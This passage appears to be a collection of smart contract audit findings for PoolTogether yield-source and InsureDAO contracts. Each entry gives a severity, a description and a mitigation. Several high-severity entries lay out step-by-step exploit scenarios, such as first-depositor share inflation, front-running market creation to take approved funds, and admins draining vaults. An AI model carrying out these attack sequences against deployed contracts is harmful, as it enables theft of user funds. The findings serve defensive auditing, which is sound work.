        - `_currentYieldSource.supplyTokenTo(currentBalance, address(this));` → This supplies the transferred 100 DAI from step 1 to the current yield source
    - We now have 100 WETH in the swappable yield source contract
3. Call `transferERC20(WETH, attackerAddress, 100 * 1e18)` to withdraw 100 WETH out of the contract to the attacker's desired address.

`_requireDifferentYieldSource()` should also verify that the yield sources' deposit token addresses are the same.

```jsx
function _requireDifferentYieldSource(IYieldSource _yieldSource) internal view {
    require(address(_yieldSource) != address(yieldSource), ""SwappableYieldSource/same-yield-source"");
		require(_newYieldSource.depositToken() == yieldSource.depositToken(), ""SwappableYieldSource/different-deposit-token"");
}
```"
24.md,Single-step process for critical ownership transfer/renounce is risky,medium,"The `SwappableYieldSource` allows owners and asset managers to set/swap/transfer yield sources/funds. As such, the contract ownership plays a critical role in the protocol.

Given that `AssetManager` is derived from `Ownable`, the ownership management of this contract defaults to `Ownable`’s `transferOwnership()` and `renounceOwnership()` methods which are not overridden here. Such critical address transfer/renouncing in one-step is very risky because it is irrecoverable from any mistakes.

Scenario: If an incorrect address, e.g. for which the private key is not known, is used accidentally then it prevents the use of all the `onlyOwner()` functions forever, which includes the changing of various critical addresses and parameters. This use of incorrect address may not even be immediately apparent given that these functions are probably not used immediately. When noticed, due to a failing `onlyOwner()`  or `onlyOwnerOrAssetManager()` function call, it will force the redeployment of these contracts and require appropriate changes and notifications for switching from the old to new address. This will diminish trust in the protocol and incur a significant reputational damage.

See similar [High Risk severity finding](https://github.com/trailofbits/publications/blob/master/reviews/hermez.pdf) from Trail-of-Bits Audit of Hermez.

See similar[ Medium Risk severity](https://github.com/Uniswap/uniswap-v3-core/blob/main/audits/tob/audit.pdf) finding from Trail-of-Bits Audit of Uniswap V3:

Recommend overriding the inherited methods to null functions and use separate functions for a two-step address change:
1) Approve a new address as a `pendingOwner`
2) A transaction from the `pendingOwner` address claims the pending ownership change.

This mitigates risk because if an incorrect address is used in step (1) then it can be fixed by re-approving the correct address. Only after a correct address is used in step (1) can step (2) happen and complete the address/ownership change.

Also, consider adding a time-delay for such sensitive actions. And at a minimum, use a multisig owner address and not an EOA."
24.md,Use of `safeApprove` will always cause `approveMax` to revert,medium,"Unlike `SwappableYieldSource` which uses `safeIncreaseAllowance` to increase the allowance to `uint256.max`, `mStableYieldSource` uses OpenZeppelin’s `safeApprove()` which has been documented as (1) Deprecated because of approve-like race condition and (2) To be used only for initial setting of allowance `(current allowance == 0)` or resetting to 0 because it reverts otherwise.

The usage here is intended to allow increase of allowance when it falls low similar to the documented usage in `SwappableYieldSource`. Using it for that scenario will not work as expected because it will always revert if current allowance is != 0. The initial allowance is already set as `uint256.max` in constructor. And once it gets reduced, it can never be increased using this function unless it is invoked when allowance is reduced completely to 0. See issue page for referenced code.

Recommend Using logic similar to `SwappableYieldSource` instead of using `safeApprove()`."
24.md,Inconsistent balance when supplying transfer-on-fee or deflationary tokens,medium,"The `supplyTokenTo` function of `SwappableYieldSource` assumes that `amount` of `_depositToken` is transferred to itself after calling the `safeTransferFrom` function (and thus it supplies `amount` of token to the yield source). However, this may not be true if the `_depositToken` is a transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount. [SwappableYieldSource.sol L211-L212](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L211-L212)

Recommend getting the actual received amount by calculating the difference of token balance before and after the transfer. For example, re-writing line 211-212 to:

```solidity
uint256 balanceBefore = _depositToken.balanceOf(address(this));
_depositToken.safeTransferFrom(msg.sender, address(this), amount);
uint256 receivedAmount = _depositToken.balanceOf(address(this)) - balanceBefore;
yieldSource.supplyTokenTo(receivedAmount, address(this));
```"
24.md,Old yield source still has infinite approval,medium,"After swapping a yield source, the old yield source still has infinite approval. Infinite approval has been used in large attacks if the yield source isn't perfectly safe ([see furucombo](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L268)).

Recommend decreasing approval after swapping the yield source."
24.md,Initialization function can be front-run with malicious values,low,"The `SwappableYieldSource.sol` has a public visibility initialization function that can be front-run, allowing an attacker to incorrectly initialize the contract, if the deployment of this contract does not safely handle initializations via a robust deployment script or a factory contract to prevent front-running.

Impact: Initialization function can be front-run by attackers, allowing them to initialize the contract with malicious values. Also, if initializations are not done atomically with creation, all public/external functions can be accessed before initialization because there are no checks to confirm initializations in those functions.

Reference: See [similar High-severity Finding 9 of Trail of Bits audit of Advanced Blockchain](https://github.com/trailofbits/publications/blob/master/reviews/AdvancedBlockchain.pdf) and [Finding 12 from Trail of Bits audit of Hermez Network](https://github.com/trailofbits/publications/blob/master/reviews/hermez.pdf).

Recommend ensuring atomic creation+deployment with script or factory contract. Add checks to confirm initialization in public/external functions."
24.md,Missing zero-address checks,low,"Zero-address checks as input validation closest to the function beginning is a best-practice. There are two places where an explicit zero-address check is missing which may lead to a later revert, gas wastage or even token burn.

1. Explicit zero-address check is missing [here](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L269) for `_newYieldSource`
 and will revert later down the control flow on [L256](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L256).

2. Missing zero-address check on ‘to’ address will lead to token burn because imBalances accounts it for the zero-address from which it can never be redeemed using `msg.sender`:
[`MStableYieldSource.sol` L85](https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L85)

[`MStableYieldSource.sol` L94](https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L94)

Recommend adding explicit zero-address checks closest to the function entry."
24.md,`onlyOwner` for `approveMaxAmount()` is risky,low,"`approveMaxAmount()` is `onlyOwner` while all other privileged functions use `onlyOwnerOrAssetManager`. This modifier should also be `onlyOwnerOrAssetManager` to prevent situations where owner has added asset managers and renounced ownership which will prevent accessing this approval function thereafter.

Recommend change `onlyOwner` to `onlyOwnerOrAssetManager`."
24.md,Overly permissive access control lets anyone approve max amount,low,"Overly permissive access control to lets anyone approve max amount. This may be ok but is inconsistent with `SwappableYieldSource.sol` where the similar function is `onlyOwner`.
`onlyOwner`. See issue page for referenced code.

Recommend checking requirements/spec and ensure this is ok or else add `Ownable` inheritance to enforce `onlyOwner` for this function."
24.md,SwappableYieldSource._requireYieldSource is not a guarantee that you are interacting with a valid yield source,low,"[`SwappableYieldSource.sol` L74](https://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L74) runs a few checks to see if the function `depositToken` is implemented.

Notice that this is not a guarantee that the target is a valid Yield Source.

This will simply verify that the contract has that method.

Any malicious attacker could implement that function and then set up the Yield Source to steal funds

In order to guarantee that the target is a valid Yield Source, you'd want to create a registry of know Yield Sources, perhaps controlled by governance or by the DAO, and check against that.

Recommend either:
1. Create any contract with just a `function depositToken returns (address)` and you'll be able to add pass the check.
2. Create an on-chain registry of known Yield Sources, either by committee or governance, and use a check against the registry, this will avoid griefing"
24.md,No input validation for while setting up value for immutable state variables,low,"Since immutable state variable cant be change after initialization in constructor, their value should be checked before initialization
[`MStableYieldSource.sol` L45](https://github.com/pooltogether/pooltogether-mstable/blob/0bcbd363936fadf5830e9c48392415695896ddb5/contracts/yield-source/MStableYieldSource.sol#L45)
```solidity
constructor(ISavingsContractV2 _savings) ReentrancyGuard() {

  // @audit --> there should be a input validation

  // As immutable storage variables can not be accessed in the constructor,
  // create in-memory variables that can be used instead.
  IERC20 mAssetMemory = IERC20(_savings.underlying());

  // infinite approve Savings Contract to transfer mAssets from this contract
  mAssetMemory.safeApprove(address(_savings), type(uint256).max);

  // save to immutable storage
  savings = _savings;
  mAsset = mAssetMemory;

  emit Initialized(_savings);
}
```

Recommend adding a require condition to validate input values."
24.md,`_requireYieldSource` does not check return value,low,"The `_requireYieldSource` function performs a low-level status code and parses the return data even if the call failed as it does not check the first return value (`success`).
It could be the case that non-zero data is returned even though the call failed, and the function would return `true`.

Check the return value or perform a high-level call using the `_yieldSource` interface."
24.md,`_requireYieldSource` not always called,low,"The function initialize of `SwappableYieldSource` checks that the yield source is valid via `_requireYieldSource`.
When you change the yield source (via `swapYieldSource` or `setYieldSource`), then the function `_setYieldSource` is called.
However `_setYieldSource`  doesn't explicitly check the yield source via `_requireYieldSource`.

The risk is low because there is an indirect check, by the following check, which only succeeds is `depositToken` is present in the new yield source:
```solidity
     require(_newYieldSource.depositToken() == yieldSource.depositToken(), ""`SwappableYieldSource`/different-deposit-token"");
```
For maintenance purposes it is more logical to always call `_requireYieldSource`, especially if the check would be made more extensive in the future.
```solidity
//https://github.com/pooltogether/swappable-yield-source/blob/main/contracts/SwappableYieldSource.sol#L98
function initialize( IYieldSource _yieldSource, uint8 _decimals, string calldata _symbol, string calldata _name, address _owner) public initializer returns (bool) {
    _requireYieldSource(_yieldSource);

 function _requireYieldSource(IYieldSource _yieldSource) internal view {
    require(address(_yieldSource) != address(0), ""SwappableYieldSource/yieldSource-not-zero-address"");
    (, bytes memory depositTokenAddressData) = address(_yieldSource).staticcall(abi.encode(_yieldSource.depositToken.selector));
    bool isInvalidYieldSource;
    if (depositTokenAddressData.length > 0) {
      (address depositTokenAddress) = abi.decode(depositTokenAddressData, (address));
      isInvalidYieldSource = depositTokenAddress != address(0);
    }
    require(isInvalidYieldSource, ""SwappableYieldSource/invalid-yield-source"");
  }

 function _setYieldSource(IYieldSource _newYieldSource) internal {
    _requireDifferentYieldSource(_newYieldSource);
    require(_newYieldSource.depositToken() == yieldSource.depositToken(), ""SwappableYieldSource/different-deposit-token"");
...

 function _requireDifferentYieldSource(IYieldSource _yieldSource) internal view {
    require(address(_yieldSource) != address(yieldSource), ""SwappableYieldSource/same-yield-source"");
  }
```

Recommend adding the following statement to `_setYieldSource`:
```solidity
_requireYieldSource(_newYieldSource);
```"
24.md,Variable name or `isInvalidYieldSource` is confusion,low,"The function `_requireYieldSource` of the contract `SwappableYieldSource` has a state variable: `isInvalidYieldSource`

You would expect `isInvalidYieldSource` == true would mean the yield source is invalid
However in the source code  `isInvalidYieldSource` == true mean the yield source is valid.

This is confusing for readers and future maintainers. Future maintainers could easily make a mistake and thus introduce vulnerabilities.

```solidity
// https://github.com/pooltogether/swappable-yield-source/blob/main/contracts/SwappableYieldSource.sol#L74
function _requireYieldSource(IYieldSource _yieldSource) internal view {
  require(address(_yieldSource) != address(0), ""SwappableYieldSource/yieldSource-not-zero-address"");
  (, bytes memory depositTokenAddressData) = address(_yieldSource).staticcall(abi.encode(_yieldSource.depositToken.selector));
  bool isInvalidYieldSource;
  if (depositTokenAddressData.length > 0) {
    (address depositTokenAddress) = abi.decode(depositTokenAddressData, (address));
    isInvalidYieldSource = depositTokenAddress != address(0);
  }
  require(isInvalidYieldSource, ""SwappableYieldSource/invalid-yield-source"");
}
```

Recommend changing `isInvalidYieldSource` to `isValidYieldSource`"
24.md,`SwappableYieldSource.sol`: Wrong reporting amount in `FundsTransferred()` event,low,"The `FundsTransferred()` event in `_transferFunds()` will report a smaller amount than expected if `currentBalance > _amount`.

This would affect applications utilizing event logs like subgraphs.

Recommend Updating the event emission to `emit FundsTransferred(_yieldSource, currentBalance);`"
24.md,`SwappableYieldSource`: `setYieldSource()` should check no deposited tokens in current yield source,low,"`setYieldSource()` changes the current yield source to a new yield source. It has similar functionality as `swapYieldSource()`, except that it doesn't transfer deposited funds from the current to the new one. However, it fails to check that it does not have any remaining deposited funds in the current yield source before the transfer.

It is highly recommended for this check to be in place so that funds aren't forgotten / unintentionally lost.

Recommend adding a require check:
`require(yieldSource.balanceOfToken(address(this)); == 0, ""SwappableYieldSource/existing-funds-in-current-yield-source"")` **before calling `_setYieldSource()"
24.md,Retrieve stuck tokens from `MStableYieldSource`,low,"Tokens sent directly to the `MStableYieldSource` will be stuck forever. Consider adding a function that allows an admin to retrieve stuck tokens:
* Balance of `mAsset` - total deposited amount of `mAsset`;
* Similar with credit balances as credits are issued as a separate erc20 token.
* All the other tokens."
24.md,Validation,low,"Function `supplyTokenTo` should check that `mAssetAmount` and `creditsIssued` > 0 and to != address(0) or if empty to address is provided, it can replace it with msg.sender to prevent potential burn of funds. function `redeemToken` should check that `mAssetAmount` and `creditsBurned` > 0. function `transferERC20` should similarly validate erc20Token, to and amount parameters. function `_mintShares` requires that shares > 0, while `_burnShares` lacks such requirement."
24.md,Some tokens do not have decimals.,low,"There are a few tokens out there that do not use any decimals. As far as I know none of them would be a good yield source, but just in case something comes out, you may want to include the possibility that decimals = 0.
[`SwappableYieldSource.sol` L116](dhttps://github.com/pooltogether/swappable-yield-source/blob/89cf66a3e3f8df24a082e1cd0a0e80d08953049c/contracts/SwappableYieldSource.sol#L116)

Recommend removing the require statement."
71.md,Tokens can be burned with no access control,high,"The Vault.sol contract has two address state variables, the `keeper` variable and the `controller` variable, which are both permitted to be the zero address. If both variables are zero simultaneously, any address can burn the available funds (available funds = balance - totalDebt) by sending these tokens to the zero address with the unprotected `utilitize()` function. If a user has no totalDebt, the user can lose their entire underlying token balance because of this.

#### Proof of Concept

The problematic `utilize()` function is [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352). To see how the two preconditions can occur:

1.  The keeper state variable is only changed by the `setKeeper()` function [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502). If this function is not called, the keeper variable will retain the default value of address(0), which bypasses [the only access control for the utilize function](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L344).
2.  There is a comment [here on line 69](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502) stating the controller state variable can be zero. There is no zero address check for the controller state variable in the Vault constructor.

If both address variables are left at their defaults of `address(0)`, then the `safeTransfer()` call [on line 348](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L348) would send the tokens to address(0).

#### Recommended Mitigation Steps

Add the following line to the very beginning of the `utilize()` function:
`require(address(controller) != address(0))`

This check is already found in many other functions in Vault.sol, including the `_unutilize()` function."
71.md,Typo in PoolTemplate unlock function results in user being able to unlock multiple times,high,"The function `unlock()` in PoolTemplate has a typo where it compares `insurances[_id].status` to `false` rather than setting it to `false`. If the conditions are met to unlock the funds for an id, the user should be able to call the `unlock()` function once for that id as `insurances[_id].amount` is subtracted from `lockedAmount`. However, since `insurances[_id].status` does not get set to `false`, a user can call `unlock()` multiple times for the same id, resulting in `lockedAmount` being way smaller than it should be since `insurances[_id].amount` is subtracted multiple times.

#### Impact

`lockedAmount` is used to calculate the amount of underlying tokens available for withdrawals. If `lockedAmount` is lower than it should be users are able to withdraw more underlying tokens than available for withdrawals.

#### Proof of Concept

Typo in `unlock()`:

*   <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L360-L362>

Calculation of underlying tokens available for withdrawal:

*   <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L836>

#### Recommended Mitigation Steps

Change `insurances[_id].status == false;` to `insurances[_id].status = false;`"
71.md,Malicious Market Creators Can Steal Tokens From Unsuspecting Approved Reference Accounts,high,"The current method of market creation involves calling `Factory.createMarket()` with a list of approved `_conditions` and `_references` accounts. If a registered template address has `templates[address(_template)].isOpen == true`, then any user is able to call `createMarket()` using this template. If the template points to `PoolTemplate.sol`, then a malicious market creator can abuse `PoolTemplate.initialize()` as it makes a vault deposit from an account that they control. The vulnerable internal function, `_depositFrom()`, makes a vault deposit from the `_references[4]` address (arbitrarily set to an approved reference address upon market creation).

Hence, if approved `_references` accounts have set an unlimited approval amount for `Vault.sol` before deploying their market, a malicious user can frontrun market creation and cause these tokens to be transferred to the incorrect market.

This issue can cause honest market creators to have their tokens transferred to an incorrectly configured market, leading to unrecoverable funds. If their approval to `Vault.sol` was set to the unlimited amount, malicious users will also be able to force honest market creators to transfer more tokens than they would normally want to allow.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L158-L231>
```solidity
function createMarket(
    IUniversalMarket _template,
    string memory _metaData,
    uint256[] memory _conditions,
    address[] memory _references
) public override returns (address) {
    //check eligibility
    require(
        templates[address(_template)].approval == true,
        ""ERROR: UNAUTHORIZED_TEMPLATE""
    );
    if (templates[address(_template)].isOpen == false) {
        require(
            ownership.owner() == msg.sender,
            ""ERROR: UNAUTHORIZED_SENDER""
        );
    }
    if (_references.length > 0) {
        for (uint256 i = 0; i < _references.length; i++) {
            require(
                reflist[address(_template)][i][_references[i]] == true ||
                    reflist[address(_template)][i][address(0)] == true,
                ""ERROR: UNAUTHORIZED_REFERENCE""
            );
        }
    }

    if (_conditions.length > 0) {
        for (uint256 i = 0; i < _conditions.length; i++) {
            if (conditionlist[address(_template)][i] > 0) {
                _conditions[i] = conditionlist[address(_template)][i];
            }
        }
    }

    if (
        IRegistry(registry).confirmExistence(
            address(_template),
            _references[0]
        ) == false
    ) {
        IRegistry(registry).setExistence(
            address(_template),
            _references[0]
        );
    } else {
        if (templates[address(_template)].allowDuplicate == false) {
            revert(""ERROR: DUPLICATE_MARKET"");
        }
    }

    //create market
    IUniversalMarket market = IUniversalMarket(
        _createClone(address(_template))
    );

    IRegistry(registry).supportMarket(address(market));
    
    markets.push(address(market));


    //initialize
    market.initialize(_metaData, _conditions, _references);

    emit MarketCreated(
        address(market),
        address(_template),
        _metaData,
        _conditions,
        _references
    );

    return address(market);
}
```

<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L178-L221>
```solidity
function initialize(
    string calldata _metaData,
    uint256[] calldata _conditions,
    address[] calldata _references
) external override {
    require(
        initialized == false &&
            bytes(_metaData).length > 0 &&
            _references[0] != address(0) &&
            _references[1] != address(0) &&
            _references[2] != address(0) &&
            _references[3] != address(0) &&
            _references[4] != address(0) &&
            _conditions[0] <= _conditions[1],
        ""ERROR: INITIALIZATION_BAD_CONDITIONS""
    );
    initialized = true;

    string memory _name = string(
        abi.encodePacked(
            ""InsureDAO-"",
            IERC20Metadata(_references[1]).name(),
            ""-PoolInsurance""
        )
    );
    string memory _symbol = string(
        abi.encodePacked(""i-"", IERC20Metadata(_references[1]).symbol())
    );
    uint8 _decimals = IERC20Metadata(_references[0]).decimals();

    initializeToken(_name, _symbol, _decimals);

    registry = IRegistry(_references[2]);
    parameters = IParameters(_references[3]);
    vault = IVault(parameters.getVault(_references[1]));

    metadata = _metaData;

    marketStatus = MarketStatus.Trading;

    if (_conditions[1] > 0) {
        _depositFrom(_conditions[1], _references[4]);
    }
}
```

#### Tools Used

Manual code review.
Discussions with kohshiba.

#### Recommended Mitigation Steps

After discussions with the sponsor, they have opted to parse a `_creator` address to `PoolTemplate.sol` which will act as the depositor and be set to `msg.sender` in `Factory.createMarket()`. This will prevent malicious market creators from forcing vault deposits from unsuspecting users who are approved in `Factory.sol` and have also approved `Vault.sol` to make transfers on their behalf."
71.md,Initial pool deposit can be stolen,high,"Note that the `PoolTemplate.initialize` function, called when creating a market with `Factory.createMarket`, calls a vault function to transfer an initial deposit amount (`conditions[1]`) *from* the initial depositor (`_references[4]`):

```solidity
// PoolTemplate
function initialize(
     string calldata _metaData,
     uint256[] calldata _conditions,
     address[] calldata _references
) external override {
     // ...

     if (_conditions[1] > 0) {
          // @audit vault calls asset.transferFrom(_references[4], vault, _conditions[1])
          _depositFrom(_conditions[1], _references[4]);
     }
}

function _depositFrom(uint256 _amount, address _from)
     internal
     returns (uint256 _mintAmount)
{
     require(
          marketStatus == MarketStatus.Trading && paused == false,
          ""ERROR: DEPOSIT_DISABLED""
     );
     require(_amount > 0, ""ERROR: DEPOSIT_ZERO"");

     _mintAmount = worth(_amount);
     // @audit vault calls asset.transferFrom(_from, vault, _amount)
     vault.addValue(_amount, _from, address(this));

     emit Deposit(_from, _amount, _mintAmount);

     //mint iToken
     _mint(_from, _mintAmount);
}
```

The initial depositor needs to first approve the vault contract for the `transferFrom` to succeed.

An attacker can then frontrun the `Factory.createMarket` transaction with their own market creation (it does not have access restrictions) and create a market *with different parameters* but still passing in `_conditions[1]=amount` and `_references[4]=victim`.

A market with parameters that the initial depositor did not want (different underlying, old whitelisted registry/parameter contract, etc.) can be created with their tokens and these tokens are essentially lost.

#### Recommended Mitigation Steps

Can the initial depositor be set to `Factory.createMarket`'s `msg.sender`, instead of being able to pick a whitelisted one as `_references[4]`?"
71.md,backdoor in `withdrawRedundant`,high,"The `Vault.withdrawRedundant` has wrong logic that allows the admins to steal the underlying vault token.

```solidity
function withdrawRedundant(address _token, address _to)
     external
     override
     onlyOwner
{
     if (
          _token == address(token) &&
          balance < IERC20(token).balanceOf(address(this))
     ) {
          uint256 _redundant = IERC20(token).balanceOf(address(this)) -
               balance;
          IERC20(token).safeTransfer(_to, _redundant);
     } else if (IERC20(_token).balanceOf(address(this)) > 0) {
          // @audit they can rug users. let's say balance == IERC20(token).balanceOf(address(this)) => first if false => transfers out everything
          IERC20(_token).safeTransfer(
               _to,
               IERC20(_token).balanceOf(address(this))
          );
     }
}
```

###### POC

*   Vault deposits increase as `Vault.addValue` is called and the `balance` increases by `_amount` as well as the actual `IERC20(token).balanceOf(this)`. Note that `balance == IERC20(token).balanceOf(this)`
*   Admins call `vault.withdrawRedundant(vault.token(), attacker)` which goes into the `else if` branch due to the balance inequality condition being `false`. It will transfer out all `vault.token()` amounts to the attacker.

#### Impact

There's a backdoor in the `withdrawRedundant` that allows admins to steal all user deposits.

#### Recommended Mitigation Steps

I think the devs wanted this logic from the code instead:

```solidity
function withdrawRedundant(address _token, address _to)
     external
     override
     onlyOwner
{
     if (
          _token == address(token)
     ) {
          if (balance < IERC20(token).balanceOf(address(this))) {
               uint256 _redundant = IERC20(token).balanceOf(address(this)) -
                    balance;
               IERC20(token).safeTransfer(_to, _redundant);
          }
     } else if (IERC20(_token).balanceOf(address(this)) > 0) {
          IERC20(_token).safeTransfer(
               _to,
               IERC20(_token).balanceOf(address(this))
          );
     }
}
```

 > We will create a PR and merge after we merge both audit/code4rena and audit/peckshield branches in the InsureDAO repository."
71.md,the first depositor to a pool can drain all users,high,"<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L807>
if there is no liquidity in the pool, the first deposit determines the total liquidity, if the amount is too small the minted liquidity for the next liquidity providers will round down to zero.

#### Impact

An attacker can steal all money from liquidity providers.

#### Proof of Concept

consider the following scenario:
a pool is created.
the attacker is the first one to deposit, they deposit with \_amount == 1, the smallest amount possible. meaning the total liquidity is 1.
then they join another pool in order to get attributions in the vault.
they transfer the attributions to the pool using `transferAttribution`.
for example, they transferred 1M dollar worth of attributions.
the next person deposits in the index, for example, 500,000 dollars.
<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L803>
the amount they will get is:

    _amount = (_value * _supply) / _originalLiquidity;

as we know:
\_amount = 500,000 dollar
\_supply = 1
\_totalLiquidity = 1,000,000 dollar (the attacker transferred directly)
the investor will get (500,000 dollar \* 1) / (1,000,000 dollar) = 0
and they will pay 500,000
this money will go to the index, and the attacker holds all of the shares, so they can withdraw it and get 1,500,000 stealing 500,000 dollars from the second investor."
71.md,Wrong design/implementation of permission control allows malicious/compromised Registry or Factory admin to steal funds from users' wallet balances,high,"The current design/implementation allows a `market` address (registered on `registry`) to call `Vault#addValue()` and transfer tokens from an arbitrary address to a specified `_beneficiary` up the approved amount at any time, and the `_beneficiary` can withdraw the funds by calling `Vault#withdrawAllAttribution()` immediately.

This poses a very dangerous risk to all the users that approved their tokens to the Vault contracts (each one holds all users' allowances for that token).

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L52-L58>

```solidity
modifier onlyMarket() {
    require(
        IRegistry(registry).isListed(msg.sender),
        ""ERROR_ONLY_MARKET""
    );
    _;
}
```

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140>

```solidity
function addValue(
    uint256 _amount,
    address _from,
    address _beneficiary
) external override onlyMarket returns (uint256 _attributions) {

    if (totalAttributions == 0) {
        _attributions = _amount;
    } else {
        uint256 _pool = valueAll();
        _attributions = (_amount * totalAttributions) / _pool;
    }
    IERC20(token).safeTransferFrom(_from, address(this), _amount);
    balance += _amount;
    totalAttributions += _attributions;
    attributions[_beneficiary] += _attributions;
}
```

Registry owner can call `Registry#supportMarket()` and mark an arbitrary address as a `market`.

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L49-L60>

```solidity
function supportMarket(address _market) external override {
    require(!markets[_market], ""ERROR: ALREADY_REGISTERED"");
    require(
        msg.sender == factory || msg.sender == ownership.owner(),
        ""ERROR: UNAUTHORIZED_CALLER""
    );
    require(_market != address(0), ""ERROR: ZERO_ADDRESS"");

    allMarkets.push(_market);
    markets[_market] = true;
    emit NewMarketRegistered(_market);
}
```

Or, the owner of the Factory can call `createMarket()` to add a malicous market contract via a custom template contract to the `markets` list.

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L214-L216>

#### Proof of Concept

A malicious/compromised Registry owner can:

1.  Call `Registry#supportMarket()` and set `markets[attackerAddress]` to `true`;
2.  Call `Vault#addValue(token.balanceOf(victimAddress), victimAddress, attackerAddress)` and transferring all the balanceOf victim's wallet to the vault, owned by `attackerAddress`.
3.  Call `Vault#withdrawAllAttribution(attackerAddress)` and retrive the funds.

The malicious/compromised Registry owner can repeat the steps above for all the users who approved the Vault contract for all the Vault contracts.

As a result, the attacker can steal all the wallet balances of the tokens approved to the protocol.

#### Root Cause

Improper access control for using users' allowances.

#### Recommendation

Consider changing the design/implementation to make sure that the allowances approved by the users can only be used by themselves."
71.md,`IndexTemplate.sol#compensate()` will most certainly fail,high,"Precision loss while converting between `the amount of shares` and `the amount of underlying tokens` back and forth is not handled properly.

***

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L438-L447>

```solidity
uint256 _shortage;
if (totalLiquidity() < _amount) {
    //Insolvency case
    _shortage = _amount - _value;
    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))
        .compensate(_shortage);
    _compensated = _value + _cds;
}
vault.offsetDebt(_compensated, msg.sender);
```

In the current implementation, when someone tries to resume the market after a pending period ends by calling `PoolTemplate.sol#resume()`, `IndexTemplate.sol#compensate()` will be called internally to make a payout. If the index pool is unable to cover the compensation, the CDS pool will then be used to cover the shortage.

However, while `CDSTemplate.sol#compensate()` takes a parameter for the amount of underlying tokens, it uses `vault.transferValue()` to transfer corresponding `_attributions` (shares) instead of underlying tokens.

Due to precision loss, the `_attributions` transferred in the terms of underlying tokens will most certainly be less than the shortage.

At L444, the contract believes that it's been compensated for `_value + _cds`, which is lower than the actual value, due to precision loss.

At L446, when it calls `vault.offsetDebt(_compensated, msg.sender)`, the tx will revert at `require(underlyingValue(msg.sender) >= _amount)`.

As a result, `resume()` can not be done, and the debt can't be repaid.

##### Proof of Concept

Given:

*   vault.underlyingValue = 10,000
*   vault.valueAll = 30,000
*   totalAttributions = 2,000,000
*   \_amount = 1,010,000

0.  \_shortage = \_amount - vault.underlyingValue = 1,000,000
1.  \_attributions = (\_amount \* totalAttributions) / valueAll = 67,333,333
2.  actualValueTransfered = (valueAll \* \_attributions) / totalAttributions = 1009999

**Expected results**: actualValueTransfered = \_shortage;

**Actual results**: actualValueTransfered < \_shortage.

#### Impact

The precision loss isn't just happening on special numbers, but will most certainly always revert the txs.

This will malfunction the contract as the index pool can not `compensate()`, therefore the pool can not `resume()`. Causing the funds of the LPs of the pool and the index pool to be frozen, and other stakeholders of the same vault will suffer fund loss from an unfair share of the funds compensated before.

#### Recommendation

Change to:

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L439-L446>

```solidity
if (totalLiquidity() < _amount) {
    //Insolvency case
    _shortage = _amount - _value;
    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))
        .compensate(_shortage);
    _compensated = vault.underlyingValue(address(this));
}
vault.offsetDebt(_compensated, msg.sender);
```"
71.md,`Vault#setController()` owner of the Vault contracts can drain funds from the Vault,high,"<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L485-L496>

```solidity
function setController(address _controller) public override onlyOwner {
    require(_controller != address(0), ""ERROR_ZERO_ADDRESS"");

    if (address(controller) != address(0)) {
        controller.migrate(address(_controller));
        controller = IController(_controller);
    } else {
        controller = IController(_controller);
    }

    emit ControllerSet(_controller);
}
```

The owner of the Vault contract can set an arbitrary address as the `controller`.

<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352>

```solidity
function utilize() external override returns (uint256 _amount) {
